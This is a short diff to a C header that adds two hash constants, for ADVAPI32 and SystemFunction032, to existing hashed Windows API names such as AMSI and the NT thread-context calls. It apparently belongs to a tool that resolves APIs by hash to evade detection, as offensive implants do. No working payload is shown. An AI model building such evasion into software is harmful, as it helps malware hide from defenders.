@@ -57,6 +57,7 @@ typedef struct _DUAL_HASH {
 #define HASH_AMSI               DUAL_HASH_CONST(0x9A1B7C4E, 0x2D5E8F6A)
 #define HASH_WININET            DUAL_HASH_CONST(0xB3C8A1F7, 0x5E9D2B4C)
 #define HASH_MSHTML             DUAL_HASH_CONST(0x4F7E2D9B, 0x1A8C5E73)
+#define HASH_ADVAPI32           DUAL_HASH_CONST(0x67208A49, 0x39794115)
 
 // =============================================================================
 // HAShes DE APIs NTDLL
@@ -76,6 +77,7 @@ typedef struct _DUAL_HASH {
 #define HASH_NtGetContextThread         DUAL_HASH_CONST(0x9E0E1A44, 0x65ECAF30)
 #define HASH_NtSetContextThread         DUAL_HASH_CONST(0x308BE0D0, 0xEA61D9E4)
 #define HASH_NtWaitForSingleObject      DUAL_HASH_CONST(0x4C6DC63C, 0xB073C52E)
+#define HASH_SystemFunction032          DUAL_HASH_CONST(0xCCCF3585, 0xC456293D)
 
 // =============================================================================
 // HAShes DE APIs KERNEL32
